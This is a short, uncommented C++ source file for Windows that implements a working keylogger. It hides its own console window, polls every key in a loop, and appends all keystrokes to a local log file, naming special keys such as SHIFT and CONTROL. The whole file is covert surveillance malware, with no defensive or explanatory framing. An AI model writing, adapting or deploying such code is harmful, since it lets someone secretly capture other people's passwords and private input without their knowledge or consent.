#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("logfile.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("\n");
		return true;
	case '�':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("SHIFT");
		return true;
	case VK_BACK:
		LOG("\b");
		return true;
	case VK_RBUTTON:
		LOG(" RIGHT_CLICK#");
		return true;
	case VK_CAPITAL:
		LOG(" CAPS_LCOK");
		return true;
	case VK_TAB:
		LOG("TAB");
		return true;
	case VK_UP:
		LOG("UP_ARROW");
		return true;
	case VK_DOWN:
		LOG("DOWN_ARROW");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("LEFT_ARROW");
		return true;
	case VK_RIGHT:
		LOG("RIGHT_ARROW");
		return true;
	case VK_CONTROL:
		LOG("CONTROL");
		return true;
	case VK_MENU:
		LOG("ALT");
		return true;
	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (!SpecialKeys(KEY)) {

					fstream LogFile;
					LogFile.open("logfile.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}